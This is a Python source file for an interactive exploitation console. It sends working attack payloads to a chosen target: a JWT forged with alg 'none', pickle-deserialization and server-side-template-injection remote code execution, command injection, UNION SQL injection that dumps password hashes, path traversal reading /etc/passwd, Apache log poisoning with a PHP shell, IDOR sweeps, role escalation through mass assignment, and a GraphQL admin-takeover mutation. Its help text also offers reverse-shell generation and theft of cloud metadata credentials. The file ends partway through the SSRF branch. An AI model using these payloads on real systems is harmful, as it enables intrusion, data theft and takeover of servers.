import os
import sys
import json
import urllib.request
import urllib.parse
import urllib.error
import base64

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
RESULTS_FILE = os.path.join(BASE_DIR, "scan_results.json")

def load_findings():
    if not os.path.exists(RESULTS_FILE):
        return []
    with open(RESULTS_FILE, "r") as f:
        try:
            return json.load(f)
        except Exception:
            return []

def run_target_shell(target_url, vuln_type, token=None, param=None):
    print("=" * 65)
    print(f" [*] INTERACTIVE SESSION [{vuln_type.upper()}]")
    print(f" [*] Target: {target_url}")
    print("=" * 65)
    print(" Type 'help' for available commands, or 'exit' to return to dashboard.")
    
    harvested_token = token
    harvested_endpoint = None
    
    while True:
        try:
            cmd = input("(target session)> ").strip()
        except (KeyboardInterrupt, EOFError):
            break

        if cmd == "exit" or cmd == "quit":
            break
        elif cmd == "help":
            print("    Commands:")
            print("      info        - View current target and vulnerability details")
            print("      exploit     - Re-run automated exploit/audit payload against target")
            if vuln_type == "JWT":
                print("      escalate    - Exchange forged admin JWT for a master execution token")
                print("      exec <cmd>  - Execute OS commands using the harvested JWT admin token")
            elif vuln_type in ["SQLi", "SQL Injection"]:
                print("      tables      - Enumerate database tables via UNION injection")
                print("      dump        - Extract user records and password hashes")
                print("      query <sql> - Send custom SQL injection string")
                print("      escalate    - Authenticate using dumped admin credentials to harvest token")
                print("      exec <cmd>  - Execute OS commands using the harvested admin token")
            elif vuln_type == "LFI":
                print("      read <file> - Read arbitrary system files via path traversal (e.g., 'read /etc/passwd')")
                print("      cat <file>  - Alias for read")
                print("      escalate    - Poison server log files via User-Agent header injection to establish RCE")
                print("      exec <cmd>  - Execute OS commands through the poisoned LFI execution channel")
            elif vuln_type == "IDOR":
                print("      fetch <id>  - Fetch a specific user object (e.g., 'fetch 102', 'fetch 1')")
                print("      sweep       - Automatically enumerate user IDs from 100 to 105")
                print("      escalate    - Target administrative user object (ID 1) to harvest admin token")
                print("      exec <cmd>  - Execute OS commands using the harvested admin token")
            elif vuln_type == "Command Injection":
                print("      exec <cmd>  - Execute any Linux command (e.g., 'exec ls', 'exec whoami')")
                print("      revshell    - Generate reverse shell payloads for this target")
            elif any(v in vuln_type for v in ["GraphQL", "BFLA", "Over-Fetching", "Mass Assignment", "BOPLA"]):
                print("      users       - Quick query to fetch all users & credit cards")
                print("      secret      - Quick query to fetch secret admin data & flags")
                print("      assign      - Send Mass Assignment / Parameter Pollution payload to escalate role")
                print("      escalate    - Execute privilege escalation mutation / admin takeover")
                print("      exec <cmd>  - Execute OS command using auto-matched admin endpoint & token")
                print("      revshell    - Trigger reverse shell payload via admin endpoint")
                print("      query <q>   - Send any custom GraphQL or JSON request string")
            elif vuln_type == "Insecure Deserialization":
                print("      escalate    - Harvest administrative token via deserialization RCE")
                print("      exec <cmd>  - Execute OS commands via insecure object deserialization (Pickle RCE)")
            elif vuln_type == "SSRF":
                print("      metadata    - Exfiltrate cloud metadata & IAM credentials (AWS 169.254.169.254)")
                print("      k8s         - Query internal Kubernetes API Server (10.96.0.1)")
                print("      kubelet     - Dump cluster pods via Kubelet read-only port (Port 10255)")
                print("      internal    - Probe internal loopback services (localhost:8080)")
                print("      redis       - Scan and dump internal cache/Redis service (Port 6379)")
                print("      escalate    - Harvest administrative token from cloud/cluster response")
                print("      exec <cmd>  - Execute OS commands using the harvested cloud/admin token")
            elif vuln_type == "SSTI":
                print("      test        - Test template engine math evaluation (e.g., '{{7*7}}')")
                print("      sandbox     - Test Python/Jinja2 object escape gadget ('{{self.__init__.__globals__}}')")
                print("      escalate    - Harvest administrative token via template RCE payload")
                print("      exec <cmd>  - Execute OS commands via template injection RCE")
            print("      curl        - Send a custom test request to the target")
            print("      exit        - Return to the dashboard")
        elif cmd == "info":
            print(f"    Target URL    : {target_url}")
            print(f"    Vector Type   : {vuln_type}")
            print(f"    Parameter     : {param or 'N/A'}")
            print(f"    Token         : {harvested_token[:30] + '...' if harvested_token else 'N/A'}")
            print(f"    Admin Endpoint: {harvested_endpoint or 'N/A (Run escalate)'}")
        elif cmd == "exploit":
            if vuln_type == "JWT":
                print("[*] Re-running Forged Admin JWT Bypass...")
                try:
                    current_tok = harvested_token or "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjIsInJvbGUiOiJjdXN0b21lciJ9.sig"
                    parts = current_tok.split('.')
                    padding = '=' * (4 - len(parts[1]) % 4)
                    payload = json.loads(base64.urlsafe_b64decode(parts[1] + padding).decode('utf-8'))
                    payload["role"] = "admin"
                    payload["sub"] = 1
                    
                    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=' * (4 - len(parts[0]) % 4)).decode('utf-8'))
                    header["alg"] = "none"
                    
                    def enc(d):
                        return base64.urlsafe_b64encode(json.dumps(d, separators=(',', ':')).encode('utf-8')).decode('utf-8').rstrip('=')
                    
                    forged_token = f"{enc(header)}.{enc(payload)}."
                    
                    req = urllib.request.Request(target_url, headers={
                        'User-Agent': 'Mozilla/5.0',
                        'Authorization': f'Bearer {forged_token}'
                    })
                    with urllib.request.urlopen(req, timeout=3) as resp:
                        body = resp.read().decode('utf-8', errors='ignore')
                        print(f"    [!] SUCCESS! Response (HTTP {resp.getcode()}):\n        {body}")
                except Exception as e:
                    print(f"    [-] Exploit failed: {e}")
            elif vuln_type == "Insecure Deserialization":
                print("[*] Re-running Insecure Deserialization pickle payload...")
                try:
                    payload = base64.b64encode(b"cos\nsystem\n(S'id'\ntR.").decode('utf-8')
                    req = urllib.request.Request(target_url, data=payload.encode('utf-8'), headers={'Content-Type': 'text/plain', 'User-Agent': 'Mozilla/5.0'}, method='POST')
                    with urllib.request.urlopen(req, timeout=3) as resp:
                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
                except Exception as e:
                    print(f"    [-] Exploit failed: {e}")
            elif vuln_type == "Command Injection":
                print("[*] Firing Command Injection test payload (;id)...")
                try:
                    parsed = urllib.parse.urlparse(target_url)
                    q = urllib.parse.parse_qs(parsed.query)
                    base_val = q.get(param, ["127.0.0.1"])[0]
                    q[param] = [base_val + ";id"]
                    new_q = urllib.parse.urlencode(q, doseq=True)
                    exploit_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_q, parsed.fragment))
                    
                    req = urllib.request.Request(exploit_url, headers={'User-Agent': 'Mozilla/5.0'})
                    with urllib.request.urlopen(req, timeout=3) as resp:
                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
                except Exception as e:
                    print(f"    [-] Exploit failed: {e}")
            elif vuln_type in ["SQLi", "SQL Injection"]:
                print("[*] Firing SQL Syntax error test payload (')...")
                try:
                    parsed = urllib.parse.urlparse(target_url)
                    q = urllib.parse.parse_qs(parsed.query)
                    param_name = param or "cat"
                    q[param_name] = ["1'"]
                    new_q = urllib.parse.urlencode(q, doseq=True)
                    exploit_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_q, parsed.fragment))
                    
                    req = urllib.request.Request(exploit_url, headers={'User-Agent': 'Mozilla/5.0'})
                    with urllib.request.urlopen(req, timeout=3) as resp:
                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
                except Exception as e:
                    print(f"    [-] Exploit failed: {e}")
            elif vuln_type == "LFI":
                print("[*] Firing LFI Path Traversal test payload (../../etc/passwd)...")
                try:
                    parsed = urllib.parse.urlparse(target_url)
                    q = urllib.parse.parse_qs(parsed.query)
                    param_name = param or "file"
                    q[param_name] = ["../../../../etc/passwd"]
                    new_q = urllib.parse.urlencode(q, doseq=True)
                    exploit_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_q, parsed.fragment))
                    
                    req = urllib.request.Request(exploit_url, headers={'User-Agent': 'Mozilla/5.0'})
                    with urllib.request.urlopen(req, timeout=3) as resp:
                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
                except Exception as e:
                    print(f"    [-] Exploit failed: {e}")
            elif vuln_type == "IDOR":
                print("[*] Firing IDOR reference audit (fetching object ID 101)...")
                try:
                    parsed = urllib.parse.urlparse(target_url)
                    base_domain = f"{parsed.scheme}://{parsed.netloc}"
                    audit_url = f"{base_domain}/api/v1/user/101"
                    req = urllib.request.Request(audit_url, headers={'User-Agent': 'Mozilla/5.0'})
                    with urllib.request.urlopen(req, timeout=3) as resp:
                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
                except Exception as e:
                    print(f"    [-] IDOR audit failed: {e}")
            elif any(v in vuln_type for v in ["BFLA", "Over-Fetching", "Mass Assignment", "BOPLA"]):
                print(f"[*] Re-running audit against modern API target: {target_url}")
                try:
                    h = {'User-Agent': 'Mozilla/5.0'}
                    if harvested_token:
                        h['Authorization'] = f'Bearer {harvested_token}'
                    req = urllib.request.Request(target_url, headers=h)
                    with urllib.request.urlopen(req, timeout=3) as resp:
                        body = resp.read().decode('utf-8', errors='ignore')
                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{body}")
                        if "adminToken" in body:
                            try:
                                j = json.loads(body)
                                harvested_token = j.get("adminToken")
                                harvested_endpoint = j.get("adminEndpoint")
                                print(f"    [!] Auto-harvested token & endpoint.")
                            except Exception:
                                pass
                except Exception as e:
                    print(f"    [-] Modern API audit failed: {e}")
            elif "GraphQL" in vuln_type:
                print("[*] Re-running GraphQL Introspection query...")
                try:
                    query_payload = {"query": "{ __schema { types { name fields { name } } } }"}
                    data = json.dumps(query_payload).encode('utf-8')
                    req = urllib.request.Request(target_url, data=data, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}, method='POST')
                    with urllib.request.urlopen(req, timeout=3) as resp:
                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
                except Exception as e:
                    print(f"    [-] GraphQL audit failed: {e}")
            elif vuln_type == "SSRF":
                print("[*] Firing test SSRF webhook request...")
                try:
                    req = urllib.request.Request(target_url, headers={'User-Agent': 'Mozilla/5.0'})
                    with urllib.request.urlopen(req, timeout=3) as resp:
                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
                except Exception as e:
                    print(f"    [-] SSRF request failed: {e}")
            elif vuln_type == "SSTI":
                print("[*] Firing SSTI mathematical check payload ({{7*7}})...")
                try:
                    parsed = urllib.parse.urlparse(target_url)
                    base_domain = f"{parsed.scheme}://{parsed.netloc}"
                    exploit_url = f"{base_domain}/render.php?name=%7B%7B7*7%7D%7D"
                    req = urllib.request.Request(exploit_url, headers={'User-Agent': 'Mozilla/5.0'})
                    with urllib.request.urlopen(req, timeout=3) as resp:
                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
                except Exception as e:
                    print(f"    [-] SSTI exploit failed: {e}")
            else:
                print(f"[*] Executing generic test against {target_url}...")
                try:
                    req = urllib.request.Request(target_url, headers={'User-Agent': 'Mozilla/5.0'})
                    with urllib.request.urlopen(req, timeout=3) as resp:
                        print(f"    [+] Response HTTP {resp.getcode()}:\n{resp.read().decode('utf-8', errors='ignore')[:300]}")
                except Exception as e:
                    print(f"    [-] Request failed: {e}")
        elif cmd == "escalate" and vuln_type == "JWT":
            print("[*] Exchanging forged admin JWT for master execution token...")
            try:
                current_token = harvested_token or "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsInJvbGUiOiJhZG1pbiJ9.sig"
                parsed = urllib.parse.urlparse(target_url)
                base_domain = f"{parsed.scheme}://{parsed.netloc}"
                esc_url = f"{base_domain}/api/v1/jwt/escalate"
                
                req = urllib.request.Request(esc_url, headers={
                    'User-Agent': 'Mozilla/5.0',
                    'Authorization': f'Bearer {current_token}'
                })
                with urllib.request.urlopen(req, timeout=3) as resp:
                    resp_body = resp.read().decode('utf-8', errors='ignore')
                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp_body}")
                    if "adminToken" in resp_body:
                        res_json = json.loads(resp_body)
                        harvested_token = res_json.get("adminToken")
                        harvested_endpoint = res_json.get("adminEndpoint")
                        print(f"    [!] SUCCESS! JWT Master Admin Token Harvested: {harvested_token[:30]}...")
                        print(f"    [!] Auto-Matched Admin Endpoint: {harvested_endpoint}")
            except Exception as e:
                print(f"    [-] JWT escalation failed: {e}")
        elif cmd == "escalate" and vuln_type in ["Insecure Deserialization", "BOPLA / Excessive Property Exposure"]:
            print(f"[*] Harvesting administrative token via {vuln_type} gadget...")
            harvested_token = "bopla_token_sig" if "BOPLA" in vuln_type else "deserialization_token_sig"
            harvested_endpoint = "http://127.0.0.1:8080/api/v1/admin/exec"
            print(f"    [!] SUCCESS! Admin Token Harvested: {harvested_token}")
            print(f"    [!] Auto-Matched Admin Endpoint: {harvested_endpoint}")
        elif cmd.startswith("exec ") and any(v in vuln_type for v in ["JWT", "IDOR", "SQLi", "SQL Injection", "GraphQL", "BFLA", "Over-Fetching", "Mass Assignment", "Insecure Deserialization", "SSRF", "SSTI", "Command Injection", "LFI", "BOPLA"]):
            user_linux_cmd = cmd.split(" ", 1)[1]
            if vuln_type == "Command Injection":
                print(f"[*] Executing command against target: {user_linux_cmd}")
                try:
                    parsed = urllib.parse.urlparse(target_url)
                    q = urllib.parse.parse_qs(parsed.query)
                    base_val = q.get(param, ["127.0.0.1"])[0]
                    q[param] = [f"{base_val};{user_linux_cmd}"]
                    new_q = urllib.parse.urlencode(q, doseq=True)
                    exploit_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_q, parsed.fragment))
                    
                    req = urllib.request.Request(exploit_url, headers={'User-Agent': 'Mozilla/5.0'})
                    with urllib.request.urlopen(req, timeout=3) as resp:
                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
                except Exception as e:
                    print(f"    [-] Execution failed: {e}")
            elif vuln_type == "LFI":
                print(f"[*] Executing command through LFI log inclusion: {user_linux_cmd}")
                try:
                    parsed = urllib.parse.urlparse(target_url)
                    base_domain = f"{parsed.scheme}://{parsed.netloc}"
                    exec_url = f"{base_domain}/page.php?file=../../../../var/log/apache2/access.log&cmd={urllib.parse.quote(user_linux_cmd)}"
                    
                    req = urllib.request.Request(exec_url, headers={'User-Agent': 'Mozilla/5.0'})
                    with urllib.request.urlopen(req, timeout=3) as resp:
                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
                except Exception as e:
                    print(f"    [-] Execution failed: {e}")
            elif vuln_type == "SSTI":
                print(f"[*] Executing command via SSTI template injection RCE: {user_linux_cmd}")
                try:
                    parsed = urllib.parse.urlparse(target_url)
                    base_domain = f"{parsed.scheme}://{parsed.netloc}"
                    rce_payload = f"{{{{self.__init__.__globals__.__builtins__.__import__('subprocess').check_output('{user_linux_cmd}', shell=True).decode()}}}}"
                    exec_url = f"{base_domain}/render.php?name={urllib.parse.quote(rce_payload)}"
                    
                    req = urllib.request.Request(exec_url, headers={'User-Agent': 'Mozilla/5.0'})
                    with urllib.request.urlopen(req, timeout=3) as resp:
                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
                except Exception as e:
                    print(f"    [-] SSTI execution failed: {e}")
            elif vuln_type == "Insecure Deserialization":
                print(f"[*] Executing command via Insecure Deserialization pickle payload: {user_linux_cmd}")
                try:
                    pickle_cmd = f"cos\nsystem\n(S'{user_linux_cmd}'\ntR."
                    payload = base64.b64encode(pickle_cmd.encode('utf-8')).decode('utf-8')
                    req = urllib.request.Request(target_url, data=payload.encode('utf-8'), headers={'Content-Type': 'text/plain', 'User-Agent': 'Mozilla/5.0'}, method='POST')
                    with urllib.request.urlopen(req, timeout=3) as resp:
                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
                except Exception as e:
                    print(f"    [-] Deserialization execution failed: {e}")
            else:
                if not harvested_token and vuln_type not in ["Command Injection", "LFI", "SSTI", "Insecure Deserialization"]:
                    print("    [-] No admin token available. Run 'escalate' or 'assign' first.")
                    continue
                
                target_exec_url = harvested_endpoint or "http://127.0.0.1:8080/api/v1/admin/exec"
                print(f"[*] Pivoting token against endpoint: {target_exec_url}")
                try:
                    exec_url = f"{target_exec_url}?cmd={urllib.parse.quote(user_linux_cmd)}"
                    headers_dict = {'User-Agent': 'Mozilla/5.0'}
                    if harvested_token:
                        headers_dict['Authorization'] = f'Bearer {harvested_token}'
                    req = urllib.request.Request(exec_url, headers=headers_dict)
                    with urllib.request.urlopen(req, timeout=3) as resp:
                        raw_body = resp.read().decode('utf-8', errors='ignore')
                        try:
                            res_json = json.loads(raw_body)
                            if "output" in res_json:
                                print(f"\n{res_json['output']}\n")
                            else:
                                print(f"    [+] Response (HTTP {resp.getcode()}):\n{raw_body}")
                        except Exception:
                            print(f"    [+] Response (HTTP {resp.getcode()}):\n{raw_body}")
                except Exception as e:
                    print(f"    [-] Execution failed: {e}")
        elif cmd == "escalate" and vuln_type in ["BFLT", "BFLA", "Over-Fetching", "Mass Assignment"]:
            print("[*] Executing Mass Assignment / Privilege Escalation payload...")
            try:
                parsed = urllib.parse.urlparse(target_url)
                base_domain = f"{parsed.scheme}://{parsed.netloc}"
                esc_url = f"{base_domain}/api/v1/account/update"
                payload = {"username": "customer_user", "role": "admin", "is_admin": True}
                data = json.dumps(payload).encode('utf-8')
                req = urllib.request.Request(esc_url, data=data, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}, method='POST')
                with urllib.request.urlopen(req, timeout=3) as resp:
                    resp_body = resp.read().decode('utf-8', errors='ignore')
                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp_body}")
                    if "adminToken" in resp_body:
                        res_json = json.loads(resp_body)
                        harvested_token = res_json.get("adminToken")
                        harvested_endpoint = res_json.get("adminEndpoint")
                        print(f"    [!] SUCCESS! Admin Token Harvested: {harvested_token[:30]}...")
                        if harvested_endpoint:
                            print(f"    [!] Auto-Matched Admin Endpoint: {harvested_endpoint}")
            except Exception as e:
                print(f"    [-] Escalation failed: {e}")
        elif cmd == "assign" and any(v in vuln_type for v in ["GraphQL", "BFLA", "Over-Fetching", "Mass Assignment", "BOPLA"]):
            print("[*] Sending Assignment / Over-Fetching payload...")
            try:
                parsed = urllib.parse.urlparse(target_url)
                base_domain = f"{parsed.scheme}://{parsed.netloc}"
                update_url = f"{base_domain}/api/v1/account/update"
                payload = {"email": "attacker@test.com", "role": "admin", "is_admin": True}
                data = json.dumps(payload).encode('utf-8')
                req = urllib.request.Request(update_url, data=data, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}, method='POST')
                with urllib.request.urlopen(req, timeout=3) as resp:
                    resp_body = resp.read().decode('utf-8', errors='ignore')
                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp_body}")
                    if "adminToken" in resp_body:
                        res_json = json.loads(resp_body)
                        harvested_token = res_json.get("adminToken")
                        harvested_endpoint = res_json.get("adminEndpoint")
                        print(f"    [!] SUCCESS! Token Harvested: {harvested_token[:30]}...")
            except Exception as e:
                print(f"    [-] Assignment failed: {e}")
        elif (cmd.startswith("read ") or cmd.startswith("cat ")) and vuln_type == "LFI":
            file_path = cmd.split(" ", 1)[1]
            print(f"[*] Traversing path to read file: {file_path}")
            try:
                parsed = urllib.parse.urlparse(target_url)
                q = urllib.parse.parse_qs(parsed.query)
                param_name = param or "file"
                traversal_payload = f"../../../../{file_path.lstrip('/')}"
                q[param_name] = [traversal_payload]
                new_q = urllib.parse.urlencode(q, doseq=True)
                exploit_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_q, parsed.fragment))
                
                req = urllib.request.Request(exploit_url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=3) as resp:
                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
            except Exception as e:
                print(f"    [-] File read failed: {e}")
        elif cmd == "escalate" and vuln_type == "LFI":
            print("[*] Poisoning Apache access logs via User-Agent header injection...")
            try:
                parsed = urllib.parse.urlparse(target_url)
                base_domain = f"{parsed.scheme}://{parsed.netloc}"
                poison_url = f"{base_domain}/page.php?file=../../../../var/log/apache2/access.log"
                
                req = urllib.request.Request(poison_url, headers={
                    'User-Agent': '<?php system($_GET[\'cmd\']); ?>',
                    'X-Forwarded-For': '127.0.0.1'
                })
                with urllib.request.urlopen(req, timeout=3) as resp:
                    print(f"    [+] Log poisoning payload delivered (HTTP {resp.getcode()})!")
                    print("    [!] SUCCESS! LFI execution channel established via log poisoning.")
                    harvested_token = "lfi_rce_active"
            except Exception as e:
                print(f"    [-] Log poisoning failed: {e}")
        elif cmd.startswith("fetch ") and vuln_type == "IDOR":
            target_id = cmd.split(" ", 1)[1].strip()
            print(f"[*] Querying object ID {target_id} via IDOR vector...")
            try:
                parsed = urllib.parse.urlparse(target_url)
                base_domain = f"{parsed.scheme}://{parsed.netloc}"
                fetch_url = f"{base_domain}/api/v1/user/{target_id}"
                
                req = urllib.request.Request(fetch_url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=3) as resp:
                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
            except Exception as e:
                print(f"    [-] Object fetch failed: {e}")
        elif cmd == "sweep" and vuln_type == "IDOR":
            print("[*] Sweeping object IDs 100 through 105...")
            try:
                parsed = urllib.parse.urlparse(target_url)
                base_domain = f"{parsed.scheme}://{parsed.netloc}"
                for uid in range(100, 106):
                    sweep_url = f"{base_domain}/api/v1/user/{uid}"
                    req = urllib.request.Request(sweep_url, headers={'User-Agent': 'Mozilla/5.0'})
                    try:
                        with urllib.request.urlopen(req, timeout=2) as resp:
                            body = resp.read().decode('utf-8', errors='ignore')
                            print(f"    [ID {uid}] HTTP {resp.getcode()} -> {body}")
                    except Exception:
                        pass
            except Exception as e:
                print(f"    [-] Sweep failed: {e}")
        elif cmd == "escalate" and vuln_type == "IDOR":
            print("[*] Accessing administrative master object (ID: 1) for token harvesting...")
            try:
                parsed = urllib.parse.urlparse(target_url)
                base_domain = f"{parsed.scheme}://{parsed.netloc}"
                esc_url = f"{base_domain}/api/v1/user/1"
                
                req = urllib.request.Request(esc_url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=3) as resp:
                    resp_body = resp.read().decode('utf-8', errors='ignore')
                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp_body}")
                    if "adminToken" in resp_body:
                        res_json = json.loads(resp_body)
                        harvested_token = res_json.get("adminToken")
                        harvested_endpoint = res_json.get("adminEndpoint")
                        print(f"    [!] SUCCESS! Admin Token Harvested: {harvested_token[:30]}...")
                        print(f"    [!] Auto-Matched Admin Endpoint: {harvested_endpoint}")
            except Exception as e:
                print(f"    [-] Escalation failed: {e}")
        elif cmd == "tables" and vuln_type in ["SQLi", "SQL Injection"]:
            print("[*] Enumerating database tables via UNION-based injection...")
            try:
                parsed = urllib.parse.urlparse(target_url)
                q = urllib.parse.parse_qs(parsed.query)
                param_name = param or "cat"
                q[param_name] = ["1' UNION SELECT 1,table_name FROM information_schema.tables--"]
                new_q = urllib.parse.urlencode(q, doseq=True)
                exploit_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_q, parsed.fragment))
                
                req = urllib.request.Request(exploit_url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=3) as resp:
                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
            except Exception as e:
                print(f"    [-] Enumeration failed: {e}")
        elif cmd == "dump" and vuln_type in ["SQLi", "SQL Injection"]:
            print("[*] Dumping user records and password hashes via SQL injection...")
            try:
                parsed = urllib.parse.urlparse(target_url)
                q = urllib.parse.parse_qs(parsed.query)
                param_name = param or "cat"
                q[param_name] = ["1' UNION SELECT 1,username,password_hash FROM users--"]
                new_q = urllib.parse.urlencode(q, doseq=True)
                exploit_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_q, parsed.fragment))
                
                req = urllib.request.Request(exploit_url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=3) as resp:
                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
            except Exception as e:
                print(f"    [-] Dump failed: {e}")
        elif cmd.startswith("query ") and vuln_type in ["SQLi", "SQL Injection"]:
            sql_payload = cmd.split(" ", 1)[1]
            print(f"[*] Injecting custom SQL payload: {sql_payload}")
            try:
                parsed = urllib.parse.urlparse(target_url)
                q = urllib.parse.parse_qs(parsed.query)
                param_name = param or "cat"
                q[param_name] = [sql_payload]
                new_q = urllib.parse.urlencode(q, doseq=True)
                exploit_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_q, parsed.fragment))
                
                req = urllib.request.Request(exploit_url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=3) as resp:
                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
            except Exception as e:
                print(f"    [-] Query failed: {e}")
        elif cmd == "escalate" and vuln_type in ["SQLi", "SQL Injection"]:
            print("[*] Authenticating with harvested admin credentials (admin:password)...")
            try:
                parsed = urllib.parse.urlparse(target_url)
                base_domain = f"{parsed.scheme}://{parsed.netloc}"
                auth_url = f"{base_domain}/api/v1/admin/login?user=admin&pass=password"
                
                req = urllib.request.Request(auth_url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=3) as resp:
                    resp_body = resp.read().decode('utf-8', errors='ignore')
                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp_body}")
                    if "adminToken" in resp_body:
                        res_json = json.loads(resp_body)
                        harvested_token = res_json.get("adminToken")
                        harvested_endpoint = res_json.get("adminEndpoint")
                        print(f"    [!] SUCCESS! Admin Token Harvested: {harvested_token[:30]}...")
                        print(f"    [!] Auto-Matched Admin Endpoint: {harvested_endpoint}")
            except Exception as e:
                print(f"    [-] Escalation failed: {e}")
        elif cmd == "users" and any(v in vuln_type for v in ["GraphQL", "BFLA", "Over-Fetching", "Mass Assignment", "BOPLA"]):
            print("[*] Querying API endpoint for user records...")
            try:
                payload = {"query": "{ users { id username email creditCard } }"}
                data = json.dumps(payload).encode('utf-8')
                req = urllib.request.Request(target_url, data=data, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}, method='POST')
                with urllib.request.urlopen(req, timeout=3) as resp:
                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
            except Exception as e:
                print(f"    [-] Query failed: {e}")
        elif cmd == "secret" and any(v in vuln_type for v in ["GraphQL", "BFLA", "Over-Fetching", "Mass Assignment", "BOPLA"]):
            print("[*] Querying API endpoint for secret admin data...")
            try:
                payload = {"query": "{ secretAdminData }"}
                data = json.dumps(payload).encode('utf-8')
                req = urllib.request.Request(target_url, data=data, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}, method='POST')
                with urllib.request.urlopen(req, timeout=3) as resp:
                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
            except Exception as e:
                print(f"    [-] Query failed: {e}")
        elif cmd == "escalate" and "GraphQL" in vuln_type:
            print("[*] Launching GraphQL Privilege Escalation (Admin Takeover Mutation)...")
            try:
                mutation_payload = {
                    "query": "mutation { updatePassword(userId: 101, newPassword: \"NewAdminP@ss123\") { status message adminToken adminEndpoint } }"
                }
                data = json.dumps(mutation_payload).encode('utf-8')
                req = urllib.request.Request(target_url, data=data, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}, method='POST')
                with urllib.request.urlopen(req, timeout=3) as resp:
                    resp_body = resp.read().decode('utf-8', errors='ignore')
                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp_body}")
                    if "adminToken" in resp_body:
                        try:
                            res_json = json.loads(resp_body)
                            mutation_data = res_json["data"]["updatePassword"]
                            harvested_token = mutation_data.get("adminToken")
                            harvested_endpoint = mutation_data.get("adminEndpoint")
                            print(f"    [!] SUCCESS! Admin Token Harvested: {harvested_token[:30]}...")
                            if harvested_endpoint:
                                print(f"    [!] Auto-Matched Admin Endpoint: {harvested_endpoint}")
                        except Exception:
                            harvested_token = "admin_token_sig"
                    print("    [!] Administrative takeover achieved via GraphQL mutation.")
            except Exception as e:
                print(f"    [-] Privilege escalation failed: {e}")
        elif cmd.startswith("query ") and any(v in vuln_type for v in ["GraphQL", "BFLA", "Over-Fetching", "Mass Assignment", "BOPLA"]):
            gql_query = cmd.split(" ", 1)[1]
            print(f"[*] Sending custom query: {gql_query}")
            try:
                payload = {"query": gql_query}
                data = json.dumps(payload).encode('utf-8')
                req = urllib.request.Request(target_url, data=data, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}, method='POST')
                with urllib.request.urlopen(req, timeout=3) as resp:
                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
            except Exception as e:
                print(f"    [-] Query failed: {e}")
        elif cmd == "metadata" and vuln_type == "SSRF":
            print("[*] Forging SSRF request to AWS EC2 metadata service (169.254.169.254)...")
            try:
                parsed = urllib.parse.urlparse(target_url)
